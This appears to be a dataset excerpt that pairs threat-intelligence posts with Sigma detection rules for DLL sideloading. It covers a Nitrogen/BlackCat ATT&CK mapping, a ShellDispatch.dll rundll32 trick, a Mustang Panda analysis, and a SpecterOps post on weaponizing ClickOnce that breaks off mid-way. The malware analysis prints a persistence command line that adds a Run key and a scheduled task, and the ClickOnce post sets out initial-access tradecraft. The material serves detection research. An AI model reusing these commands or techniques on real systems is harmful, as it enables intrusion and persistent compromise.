Collection, Command and Control, and Exfiltration. Each category lists specific tools (like Nitrogen, Sliver, Cobalt Strike, etc.) and their corresponding techniques, indicated by MITRE ATT&CK identifiers (e.g., T1189 for Drive-by Compromise). The structure provides a clear overview of the attack methodology.\nTranscription: |\n  25590 - Nitrogen Campaign Drops Sliver and Ends With BlackCat Ransomware\n  \n  | Tools                | Technique                                                       |\n  | -------------------- | --------------------------------------------------------------- |\n  | Initial Access       | Nitrogen - Drive-by Compromise - T1189                          |\n  | Execution            | Sliver - Malicious File - T1204.002                             |\n  |                      | Cobalt Strike - PowerShell - T1059.001                          |\n  |                      | PsExec - Python - T1059.006                                     |\n  |                      | Windows Command Shell - T1059.003                               |\n  |                      | Service Execution - T1569.002                                   |\n  |                      | Windows Management Instrumentation - T1047                      |\n  | Persistence          | Cobalt Strike - Winlogon Helper DLL - T1547.004                 |\n  |                      | up.bat - Scheduled Task/Job: Scheduled Task - T1053.005         |\n  |                      | Account Manipulation - T1098                                    |\n  | Privilege Escalation | Cobalt Strike - Scheduled Task/Job: Scheduled Task - T1053.005  |\n  |                      | Dynamic-Link Library Injection - T1055.001                      |\n  | Defense Evasion      | Nitrogen - DLL Side-Loading - T1574.002                         |\n  |                      | PyFuscate - Match Legitimate Name or Location - T1036.005       |\n  |                      | Sliver - Process Injection - T1055                              |\n  |                      | Cobalt Strike - Clear Windows Event Logs - T1070.001            |\n  |                      | Blackcat - Safe Mode Boot - T1562.009                           |\n  |                      | Encrypted/Encoded File - T1027.013                              |\n  | Credential Access    | Cobalt Strike - OS Credential Dumping: LSASS Memory - T1003.001 |\n  |                      | net - Account Discovery: Local Account - T1087.001              |\n  |                      | nltest - Account Discovery: Domain Account - T1087.002          |\n  |                      | ping - Domain Trust Discovery - T1482                           |\n  |                      | ipconfig - Local Groups - T1069.001                             |\n  |                      | SharpHound - Domain Groups - T1069.002                          |\n  |                      | PowerSploit - Network Share Discovery - T1135                   |\n  |                      | Remote System Discovery - T1018                                 |\n  | Lateral Movement     | Impacket - Remote Desktop Protocol - T1021.001                  |\n  |                      | SMB/Windows Admin Shares - T1021.002                            |\n  |                      | Lateral Tool Transfer - T1570                                   |\n  | Collection           | Data from Network Shared Drive - T1039                          |\n  | Command and Control  | Sliver - Web Protocols - T1071.001                              |\n  |                      | Cobalt Strike - Ingress Tool Transfer - T1105                   |\n  | Exfiltration         | Restic - Exfiltration Over Alternative Protocol - T1048         |\n  | Impact               | BlackCat - Inhibit System Recovery - T1490                      |\n  |                      | 1.bat - Data Encrypted for Impact - T1486                       |\n```\n\n```\nAccount Manipulation - T1098\nClear Windows Event Logs - T1070.001\nData Encrypted for Impact - T1486\nData from Network Shared Drive - T1039\nDLL Side-Loading - T1574.002\nDomain Groups - T1069.002\nDomain Trust Discovery - T1482\nDrive-by Compromise - T1189\nDynamic-link Library Injection - T1055.001\nEncrypted/Encoded File - T1027.013\nExfiltration Over Alternative Protocol - T1048\nIngress Tool Transfer - T1105\nInhibit System Recovery - T1490\nLateral Tool Transfer - T1570\nLocal Account - T1087.001\nLocal Groups - T1069.001\nLSASS Memory - T1003.001\nMalicious File - T1204.002\nMasquerading - T1036\nMatch Legitimate Name or Location - T1036.005\nNetwork Share Discovery - T1135\nPowerShell - T1059.001\nProcess Injection - T1055\nPython - T1059.006\nRemote Desktop Protocol - T1021.001\nRemote System Discovery - T1018\nSafe Mode Boot - T1562.009\nScheduled Task - T1053.005\nService Execution - T1569.002\nSMB/Windows Admin Shares - T1021.002\nWeb Protocols - T1071.001\nWindows Command Shell - T1059.003\nWindows Management Instrumentation - T1047\nWinlogon Helper DLL - T1547.004\n```",
    "sigma_rule": {
      "title": "Potential Python DLL SideLoading",
      "id": "d36f7c12-14a3-4d48-b6b8-774b9c66f44d",
      "status": "experimental",
      "description": "Detects potential DLL sideloading of Python DLL files.",
      "references": [
        "https://www.securonix.com/blog/seolurker-attack-campaign-uses-seo-poisoning-fake-google-ads-to-install-malware/",
        "https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/",
        "https://github.com/wietze/HijackLibs/tree/dc9c9f2f94e6872051dab58fbafb043fdd8b4176/yml/3rd_party/python"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": [
            "\\python39.dll",
            "\\python310.dll",
            "\\python311.dll",
            "\\python312.dll"
          ]
        },
        "filter_main_default_install_paths": [
          {
            "ImageLoaded|startswith": [
              "C:\\Program Files\\Python3",
              "C:\\Program Files (x86)\\Python3"
            ]
          },
          {
            "ImageLoaded|contains": "\\AppData\\Local\\Programs\\Python\\Python3"
          }
        ],
        "filter_optional_visual_studio": {
          "ImageLoaded|startswith": "C:\\Program Files\\Microsoft Visual Studio\\"
        },
        "filter_optional_cpython": {
          "ImageLoaded|contains": [
            "\\cpython\\externals\\",
            "\\cpython\\PCbuild\\"
          ]
        },
        "filter_main_legit_signature_details": {
          "Product": "Python",
          "Signed": "true",
          "Description": "Python",
          "Company": "Python Software Foundation"
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Legitimate software using Python DLLs"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_python.yml",
    "id": "35"
  },
  {
    "url": "https://www.hexacorn.com/blog/2023/06/07/this-lolbin-doesnt-exist/",
    "markdown": "# This LOLBIN doesn’t exist…\n\nPosted on 2023-06-07\n\nI have written about Nullsoft installer a few times before. I am a bit fascinated by it, because there is not that much research about it, in general, and even less – about its esoteric, yet omnipresent DLL plug-ins…\n\nOne of the more interesting plug-ins that I know of, and yet, one that you will never really see residing on any system, is… *ShellDispatch.dll*.\n\nIt’s a rarely used Nullsoft Plug-In DLL that is known to be used by the installer of WinAmp, yes.. THE WinAmp… and even there… it is used temporarily, as it is immediately deleted from the file system after delivering the required functionality.\n\nWhat’s so special about it?\n\nThe *ShellDispatch.dll* exports a few functions:\n\n- AddRef\n- GetInterface\n- Release\n- RunDll_ShellExecuteW\n- ShellExecute\n\nThe *RunDll_ShellExecuteW* is the most interesting to us as it is a callback function specifically crafted to respond to invocations via *rundll32.exe*, and since it’s a wrapper for *ShellExecute* API we can use it to launch any program of our choice, f.ex, calculator:\n\n```\nrundll32 ShellDispatch.dll, RunDll_ShellExecute open calc\n```\n\n```image\nAlt: ShellDispatch\nDescription: The image depicts a command line interface (CLI) window showing an administrator command prompt on a Windows system. The prompt indicates that the current directory is 'C:\\test>', suggesting it's a command line session where commands can be executed. This type of interface is typically used for running scripts or executing commands in a Windows environment, relevant to the discussion of executing functions via the 'rundll32.exe' command as mentioned in the context.\nTranscription: |\n  Administrator: C:\\Windows\\System32\\cmd.exe\n  C:\\test>\n```\n\nAgain, the chances you will ever see it abused are VERY LOW.",
    "sigma_rule": {
      "title": "Potential ShellDispatch.DLL Sideloading",
      "id": "844f8eb2-610b-42c8-89a4-47596e089663",
      "status": "test",
      "description": "Detects potential DLL sideloading of \"ShellDispatch.dll\"",
      "references": [
        "https://www.hexacorn.com/blog/2023/06/07/this-lolbin-doesnt-exist/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-06-20",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": "\\ShellDispatch.dll"
        },
        "filter_main_legit_path": [
          {
            "ImageLoaded|contains|all": [
              ":\\Users\\",
              "\\AppData\\Local\\Temp\\"
            ]
          },
          {
            "ImageLoaded|contains": ":\\Windows\\Temp\\"
          }
        ],
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Some installers may trigger some false positives"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_shelldispatch.yml",
    "id": "38"
  },
  {
    "url": "https://web.archive.org/web/20231129000043/https://lab52.io/blog/new-mustang-pandas-campaing-against-australia/",
    "markdown": "# New Mustang Panda’s campaign against Australia\n\n**May 03, 2023**\n\nAUKUS (Australia-United Kingdom-United States) is a strategic military alliance between these territories that became a reality in 2021, whose main objective is to build nuclear-powered submarines to counter the threat from China in the Indo-Pacific region. This agreement also includes the sharing of cyber capabilities and other submarine technologies. Some sources point out that this is not a security pact, but is rather intended to “elevate the intelligence and deterrence value of conventional capabilities”.\n\nThe key facts of this alliance are as follows:\n\n- The US pledged to invest $4.6 billion in the deal. Australia, for its part, will buy at least three second-hand submarines from the US early in the next decade. However, the US Congress has yet to approve this transaction. In addition, Australia will build a fleet of eight nuclear submarines. The first of these is expected to be ready in 2042.\n\n- This partnership has upset both France and China. Australia will terminate the contract awarded to France to build 12 diesel-electric submarines. The importance of these submarines is reflected in their capabilities: compared to traditional submarines, they have a longer range, are harder to detect, can remain submerged for months and have a greater carrying capacity. However, they are larger, which is why nuclear submarines are more vulnerable to attack from the surface.\n\n- Last year, China called the deal “destabilising” and “provocative”. Mao Ning, spokesperson for China’s Foreign Ministry, said at a press conference on 9th March that Australia is contributing to the proliferation of nuclear weapons, is promoting an arms race and that this agreement only destabilises the Asia-Pacific region. In addition, China issued the following threat: “Australian troops are also more likely to be the first group of Western soldiers to waste their lives in the South China Sea”.\n\nThe Lab52 team has already detected the possibility that actors associated with China, especially Mustang Panda, could carry out attacks against the Australian government, notifying its clients.\n\nLab52 has found a zip file named _Biography of Senator the Hon Don Farrell.zip_. Hon Don Farrell is the current Australian Secretary of State for Trade and Tourism, indicating a targeted campaign against Australia.\n\nThe zip drops two files. On the one hand, the legitimate application for process pdf files Solid PDF Creator, renamed as _Biography of Senator the Hon Don Farrell/Biography of Senator the Hon Don Farrell.exe_, on the other hand, we have seen a malicious payload named SolidPDFCreator.dll. Persistence is done through a Dll Side Loading by the stager.\n\n```image\nAlt: Illustration 2 Stage activity\nDescription: The image displays a snippet of code likely related to a malicious payload operation. It showcases assembly language instructions that involve manipulating file paths and executing commands that copy a DLL file named 'SolidPDFCreator.dll' to a user directory, potentially as part of a cyber attack. The code indicates actions such as fetching module handles and executing command line instructions, which are typical in malware behavior for persistence and execution.\nTranscription: |\n  push    [ebp+var_58], eax\n  call    esi ; GetModuleHandleW\n  push    eax                ; hModule\n  lea     ecx, [ebp+var_60]\n  push    ecx\n  mov     esi, eax\n  call    edi ; GetProcAddress\n  push    offset aCWindowsSystem ; \"\\\\??\\\\C:\\\\Windows\\\\system32\\\\cmd.exe\"\n  lea     ecx, [ebp+var_60]\n  push    ecx\n  mov     esi, eax\n  call    ebx\n  push    offset aCCopySolidpdf ; \"/C copy SolidPDFCreator.dll C:\\\\Users\\\\\"\n  lea     edx, [ebp+var_68]\n  push    edx\n```\n\n```\nC:\\Windows\\SysWOW64\\cmd.exe /C copy SolidPDFCreator.dll C:\\Users\\Public\\Libraries\\PhotoTvRHD\\SolidPDFCreator.dll & reg add “HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” /v SolidPDF /t reg_sz /d “C:\\Users\\Public\\Libraries\\PhotoTvRHD\\SolidPDFCreator.exe” /F & schtasks /F /Create /TN SolidPDF /SC minute /MO 1 /TR C:\\Users\\Public\\Libraries\\PhotoTvRHD\\SolidPDFCreator.exe\n```\n\nAfter that, the stager tries to impersonate common Microsoft update communications, hardcoding a legitimate host header www.asia.microsoft.com, which, in fact, is requesting against 123.253.35[.]231 as C2.\n\n```image\nAlt: Illustration 3 Stage request\nDescription: The image displays a screenshot of an HTTP POST request made to a Microsoft update redirection URL. It includes various HTTP headers such as 'Host', 'User-Agent', 'Accept', 'Accept-Language', 'Connection', and 'Content-Length'. The content of the request signifies an attempt to mimic legitimate Microsoft update traffic, indicating a potential cyber attack tactic related to the Mustang Panda campaign against Australia.\nTranscription: |\n  POST /v11/2/windowsupdate/redir/v6-winsp1-wuredir?878182977 HTTP/1.1\n  Host: www.asia.microsoft.com\n  Upgrade-Insecure-Requests: 1\n  User-Agent: Windows-Update-Agent\n  Accept: text/html,*/*;q=0.8\n  Accept-Language: en-US,en;q=0.9\n  Connection: Keep-Alive\n  Content-Length: 44\n  \n  FwMDABxfv7jv61niXGU2EXdUEGYqT2MyTzcyASs/Qgh1\n```\n\nIt is worth noting that it does not download the PlugX malware in the first instance, as usual, but, similar to what has been reported previously by Talos Intelligence [1] or Cisco [2], it uses a custom-developed stager, subsequently providing the attacker with a reverse shell for a PlugX deployment.\n\nAs can be seen, China has developed cyber capabilities that allow it to respond quickly to any geopolitical event that might affect its interests. The AUKUS treaty has been a regional destabilisation for China, and more campaigns are expected to continue to target Australia. Lab52 highlights how tracking and monitoring events in international relations allows us to understand the motivations of key actor-states.\n\n### IOC\n\n- 123.253.35[.]231\n- 4fbfbf1cd2efaef1906f0bd2195281b77619b9948e829b4d53bf1f198ba81dc5\n- e2acbc36c2cce4050e34033c12f766fea58b4196d84cf40e979fac8fed24c942\n- 3c4671b4a0c3e7da186bd356e07cf0daca7267addde668044b1ded42c6dbe09b\n- 5dde3bca0e5319c62d547bd0c37e621f2050598a347447bde832a9fc37efd97d\n- 167a842b97d0434f20e0cd6cf73d07079255a743d26606b94fc785a0f3c6736e\n- 41276827827b95c9b5a9fbd198b7cff2aef6f90f2b2b3ea84fadb69c55efa171\n- f8e6b2e537325d6775d35755c8fe19ef89b27e1a7aba183490fbcbf2d52c15f4\n\n### References\n\n[1] – https://blog.talosintelligence.com/mustang-panda-targets-europe/\n[2] – https://gblogs.cisco.com/jp/2022/05/talos-mustang-panda-targets-europe/",
    "sigma_rule": {
      "title": "Potential SolidPDFCreator.DLL Sideloading",
      "id": "a2edbce1-95c8-4291-8676-0d45146862b3",
      "status": "test",
      "description": "Detects potential DLL sideloading of \"SolidPDFCreator.dll\"",
      "references": [
        "https://web.archive.org/web/20231129000043/https://lab52.io/blog/new-mustang-pandas-campaing-against-australia/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-05-07",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": "\\SolidPDFCreator.dll"
        },
        "filter_main_path": {
          "Image|endswith": "\\SolidPDFCreator.exe",
          "ImageLoaded|startswith": [
            "C:\\Program Files (x86)\\SolidDocuments\\SolidPDFCreator\\",
            "C:\\Program Files\\SolidDocuments\\SolidPDFCreator\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_solidpdfcreator.yml",
    "id": "39"
  },
  {
    "url": "https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5",
    "markdown": "# Less SmartScreen More Caffeine: (Ab)Using ClickOnce for Trusted Code Execution\n\nThe contents of this blogpost was written by Nick Powers (@zyn3rgy) and Steven Flores (@0xthirteen), and is a written version of the content presented at Defcon30.\n\nWith the barrier to entry for initial access ever increasing, we spent some time digging into potentially lesser-known weaponization options for ClickOnce deployments. A few of the hurdles we’d like to overcome by implementing these weaponization options include:\n\n- Install / execute application without administrative privileges\n- Reputable, known-good file(s) used during execution\n- Streamlined, minimal user interaction required\n- Ease of rerolling execution implementations\n\nUltimately, we want to take a relatively common initial access technique known as ClickOnce and extend its value for the offensive use case by abusing the trust of third-party applications.\n\n---\n\n## ClickOnce Overview and Current Weaponizations\n\n> “ClickOnce is a deployment technology that enables you to create self-updating Windows-based applications that can be installed and run with minimal user interaction” - MSDN\n\nClickOnce is a vehicle for installing and updating .NET applications. Deployments can be published through a variety of options (e.g. network file shares, legacy media [CD-ROM], and web pages). We will be focusing on the web page method of publishing deployments. Legitimate applications exist and make use of ClickOnce deployments for installation or updating software such as Chrome (previously), Fidelity, and others.\n\nClickOnce deployments rely on manifests which are formatted in a very specific way. Just like .NET applications, there will be different types of manifests that need to be accounted for. There are three types of manifest to become familiar with when discussing ClickOnce deployments:\n\n> ClickOnce deployment manifests\n\n- *.application is the file extension for these\n- References the ClickOnce application manifest to deploy\n- APPREF-MS file will point to this (if used)\n\n> ClickOnce application manifests\n\n- *.exe.manifest is the file extension for these\n- Specifies dependencies for the deployment (states version of .NET that will be utilized)\n- Conducts integrity check of deployment manifest\n- References to dependencies and other files for delivery\n\n> Embedded application and assembly manifests\n\n- Application manifest can also be called unmanaged or fusion manifest\n- Assembly manifest can also be called managed manifest\n- At runtime, ClickOnce makes comparisons against these\n\n```image\nAlt: Embedded Assembly Manifest\nDescription: The image displays a segment of code written in C# that is related to .NET assembly attributes. It includes various assembly attributes like AssemblyVersion, AssemblyTitle, AssemblyDescription, and others which are essential for defining the properties and metadata of a .NET assembly. The code snippet also contains references to the system's configuration settings and assemblies needed for the execution of the program, specifically a tool named 'CasPol.exe' which is part of the .NET Framework.\nTranscription: |\n  // C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CasPol.exe\n  // caspol, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\n  // Entry point: Microsoft.Tools.caspol.caspol.Main\n  // Timestamp: SDD4A1DE (11/4/2019 8:39:58 AM)\n  \n  using System;\n  using System.Diagnostics;\n  using System.Reflection;\n  using System.Resources;\n  using System.Runtime.CompilerServices;\n  using System.Runtime.InteropServices;\n  \n  [assembly: AssemblyVersion(\"4.0.0.0\")]\n  [assembly: CompilationRelaxations(8)]\n  [assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]\n  [assembly: ComVisible(false)]\n  [assembly: CLSCompliant(true)]\n  [assembly: AssemblyTitle(\"caspol.exe\")]\n  [assembly: AssemblyDescription(\"caspol.exe\")]\n  [assembly: AssemblyCompany(\"Microsoft Corporation\")]\n  [assembly: AssemblyProduct(\"Microsoft .NET Framework\")]\n  [assembly: AssemblyCopyright(\"@ Microsoft Corporation. All rights reserved.\")]\n  [assembly: AssemblyFileVersion(\"4.8.4084.0\")]\n  [assembly: AssemblyInformationalVersion(\"4.8.4084.0\")]\n  [assembly: SatelliteContractVersion(\"4.0.0.0\")]\n  [assembly: NeutralResourcesLanguage(\"en-US\")]\n  [assembly: AssemblyDelaySign(true)]\n  [assembly: AssemblyKeyFile(@\"..\\..\\tools\\devdiv\\FinalPublicKey.snk\")]\n  [assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]\n  [assembly: DefaultDllImportSearchPaths(DllImportSearchPath.System32 | DllImportSearchPath.AssemblyDirectory)]\n```\n\n```image\nAlt: Embedded Application Manifest\nDescription: The image displays an XML manifest file for a ClickOnce application. It includes various sections such as the XML version, encoding, and application identity. Key elements include security settings, compatibility information, and application details. The manifest specifies requested privileges and execution levels, indicating that the application is designed to run with minimal user interaction and detail the supported operating systems.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n  <assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\n    <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>\n    <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\n      <security>\n        <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\n          <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>\n        </requestedPrivileges>\n      </security>\n    </trustInfo>\n    <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\n      <application>\n        <!-- This ID below indicates app support for Windows 7 -->\n        <supportedOS Id=\"{3313b89a-5d96-4fbd-8e2d-a2440225f93a}\"/>\n        <!-- The ID below indicates app support for Windows Developer Preview and appears to be the latest for Win8 -->\n        <supportedOS Id=\"{42af2e83-533b-4441-ba9c-d694da4a6e38}\"/>\n        <!-- The ID below indicates app support for Windows Developer Preview and appears to be the latest for Win8 -->\n        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>\n      </application>\n    </compatibility>\n  </assembly>\n```\n\n```image\nAlt: ClickOnce Deployment Manifest, Executable, and Application Manifest\nDescription: The image displays a file directory structure related to a ClickOnce deployment. It shows the folder 'Clickonce_Demo1' containing three files: 'Clickonce_Demo1.application', 'Click_Demo1.exe.deploy', and 'Click_Demo1.exe.manifest'. Each file has a date modified timestamp of '4/19/2022 9:35 PM' and indicates their respective types—Application Manifest, DEPLOY File, and MANIFEST File—with sizes of 6 KB and 7 KB. This structure is relevant for understanding ClickOnce deployment manifests as discussed in the accompanying text.\nTranscription: |\n  Name                            Date modified        Type                    Size\n  Clickonce_Demo1.application     4/19/2022 9:35 PM    APPLICATION Manifest    6 KB\n  Clickonce_Demo1.exe.deploy      4/19/2022 9:35 PM    DEPLOY File             6 KB\n  Clickonce_Demo1.exe.manifest    4/19/2022 9:35 PM    MANIFEST File           7 KB\n```\n\nClickOnce applications can be deployed to a client by visiting the *.application deployment manifest using a browser. The download and execution process of a standard ClickOnce deployment requires the end user to be using a Microsoft Edge or Internet Explorer browser. An alternative to requiring the target user to access your deployment manifest from either Edge or Internet Explorer would be to leverage APPREF-MS. When creating an *.appref-ms file, UTF-16 LE encoding is required. An appref-ms file would be used if the end user is using something like Chrome or Firefox to access the application.\n\n> **NOTE:** A simple user-agent check can be done prior to reaching the landing page to determine whether the incoming request should be pointed towards the standard deployment manifest or an appref-ms file.\n\nThe host assembly, specified in the manifest, will spawn as a child process of ‘dfsvc.exe’, which handles the ClickOnce deployment functionality that is imported from ‘System.Deployment.dll’. The contents of the ClickOnce application manifest will specify what dependencies and other resources will be delivered during the deployment process. The contents of the deployment will ultimately be saved to:\n\n> `C:\\Users\\%USERNAME%\\AppData\\Local\\Apps\\2.0\\<randomstring>`\n\nOnce a user has accepted to run the application, the deployment manifest will look to the ClickOnce application manifest for all the files that need to be downloaded.\n\n```image\nAlt: ClickOnce Deployment Manifest Example\nDescription: The image displays a snippet of XML code that represents a ClickOnce deployment manifest. It includes details about the compatible frameworks and a dependency assembly. Specifically, it highlights the codebase path to the manifest file of a ClickOnce application, along with its version, public key token, and processor architecture. This information is crucial for understanding how the ClickOnce deployment mechanism operates.\nTranscription: |\n  <compatibleFrameworks xmlns=\"urn:schemas-microsoft-com:clickonce.v2\">\n      <framework targetVersion=\"4.7.2\" profile=\"full\" supportedRuntime=\"4.0.30319\" />\n  </compatibleFrameworks>\n  <dependency>\n      <dependentAssembly dependencyType=\"install\" codebase=\"Application Files\\ClickOnce_1.1.07.13875\\ClickOnce.exe.manifest\" size=\"55369\">\n          <assemblyIdentity name=\"ClickOnce.exe\" version=\"1.1.07.13875\" publicKeyToken=\"0000000000000000\" language=\"neutral\" processorArchitecture=\"msil\" type=\"win32\" />\n      </dependentAssembly>\n  </dependency>\n```\n\nThere will be different pieces of information located throughout the manifest that look very similar to .NET application manifests. This will contain all of the files and dependencies the deployment will need to execute properly.\n\n```image\nAlt: ClickOnce Application Manifest Example\nDescription: The image displays a code snippet that appears to be an XML representation of a ClickOnce deployment manifest. It includes various `dependency` and `file` elements, each detailing the properties of the assemblies and files required for the application. The `dependentAssembly` sections specify the `assemblyIdentity` with attributes such as `dependencyType`, `codebase`, `version`, and `size`, indicating the dependencies needed for the application to function correctly. The `file` elements list specific files included in the deployment, along with their names and sizes.\nTranscription: |\n  <dependency>\n      <dependentAssembly dependencyType=\"install\" allowDelayedBinding=\"true\" codebase=\"GRBase.dll\" size=\"1283072\">\n          <assemblyIdentity name=\"GRBase\" version=\"1.1.7.13875\" language=\"neutral\" processorArchitecture=\"msil\" />\n      </dependentAssembly>\n  </dependency>\n  <dependency>\n      <dependentAssembly dependencyType=\"install\" allowDelayedBinding=\"true\" codebase=\"GRPrincipal.dll\" size=\"146432\">\n          <assemblyIdentity name=\"GRPrincipal\" version=\"1.1.7.13875\" language=\"neutral\" processorArchitecture=\"msil\" />\n      </dependentAssembly>\n  </dependency>\n  <dependency>\n      <dependentAssembly dependencyType=\"install\" allowDelayedBinding=\"true\" codebase=\"Infra.dll\" size=\"68096\">\n          <assemblyIdentity name=\"Infra\" version=\"1.1.7.13875\" language=\"neutral\" processorArchitecture=\"msil\" />\n      </dependentAssembly>\n  </dependency>\n  <dependency>\n      <dependentAssembly dependencyType=\"install\" allowDelayedBinding=\"true\" codebase=\"WebserviceClients.dll\" size=\"508416\">\n          <assemblyIdentity name=\"WebserviceClients\" version=\"1.1.7.13875\" language=\"neutral\" processorArchitecture=\"msil\" />\n      </dependentAssembly>\n  </dependency>\n  <file name=\"CCe.zip\" size=\"84771\" />\n  <file name=\"ClickOnce.exe.config\" size=\"31570\" />\n  <file name=\"NFe.zip\" size=\"1646533\" />\n  <file name=\"Resources/clickOnce.ico\" size=\"113799\" />\n  <file name=\"Resources/globe.ico\" size=\"67646\" />\n  <file name=\"Resources/logo.png\" size=\"67646\" />\n```\n\nThe dfsvc process will make a series of HTTP requests for the downloads and save in the %LocalAppData% location mentioned above.\n\n```image\nAlt: HTTP Requests While Downloading a ClickOnce Application\nDescription: The image displays a series of HTTP GET requests as seen in a network monitoring tool or terminal. Each line represents a request for various files associated with a ClickOnce application deployment, including manifests, images, and DLLs. The requests indicate the retrieval of components necessary for the installation and execution of a .NET application using ClickOnce technology.\nTranscription: |\n  \"GET /clickonce.html HTTP/1.1\"\n  \"GET /ClickOnce.application HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/ClickOnce.exe.manifest HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Resources/ClickOnce.ico.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Resources/globe.ico.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Resources/CCe.zip.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Resources/logo.png.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/NFe.zip.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/ClickOnce.exe.config.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Infra.dll.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/GRBase.dll.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/GRPrincipal.dll.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/WebserviceClients.dll.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/GR.Presentation.Infra.dll.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Facilities.dll.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/ClickOnce.exe.deploy HTTP/1.1\"\n```\n\nIn some scenarios users may want to interact with ClickOnce applications but are not using Microsoft Edge or Internet Explorer. An appref-ms file can be created that will act similar to an LNK or shortcut file that will contain the URL of the deployment manifest and some other pieces of information.\n\n```image\nAlt: APPREF-MS Example\nDescription: The image displays a URL pointing to a ClickOnce deployment manifest file, formatted as a web link. The URL includes the address 'https://192.168.1.1/files/ClickOnce.application' followed by a fragment '#ClickOnce', and additional parameters indicating 'Culture=neutral' and 'processorArchitecture=msil'. This format is relevant for initiating ClickOnce applications, as it specifies the deployment details necessary for executing a .NET application.\nTranscription: https://192.168.1.1/files/ClickOnce.application##ClickOnce, Culture=neutral, processorArchitecture=msil\n```\n\nDuring the process before all the downloading happens, the System.Deployment DLL will be utilized to run through various checks and ensure the ClickOnce application can properly execute. One important check to note is the .NET application and ClickOnce deployment identities that are configured in the assembly and the deployment manifests.\n\n```image\nAlt: System.Deployment.dll Logic to Parse Manifests\nDescription: The image is a code snippet that appears to be written in C#, showcasing how to handle assembly manifests in the context of ClickOnce deployment. Key components include variable declarations for dependent assemblies and manifest elements, along with a conditional check to validate the identity of the assembly manifest against the dependent assembly's identity. The code highlights the process of managing application and deployment manifests during the ClickOnce application execution.\nTranscription: |\n  DependentAssembly dependentAssembly = (DependentAssembly)dependencyDownloadCookie.ManifestElement;\n  AssemblyManifest deployManifest = dependencyDownloadCookie.DeployManifest;\n  AssemblyManifest appManifest = dependencyDownloadCookie.AppManifest;\n  AssemblyManifest assemblyManifest = new AssemblyManifest(e.FileLocalPath);\n  \n  if (!assemblyManifest.Identity.Matches(dependentAssembly.Identity, true))\n  {\n      throw new InvalidDeploymentException(ExceptionTypes.RefDefValidation, string.Format(CultureInfo.CurrentUICulture, \n      {\n          fileName\n      }));\n  }\n```\n\nCommonly, when crafting an initial access payload and using ClickOnce, you’d go through the process of writing it up in an IDE like Visual Studio and building the ClickOnce application. So what does standard ClickOnce deployment execution look like, using a newly created .NET application?\n\n<iframe allowfullscreen=\"\" class=\"em n fe dz bh\" frameborder=\"0\" height=\"480\" scrolling=\"no\" 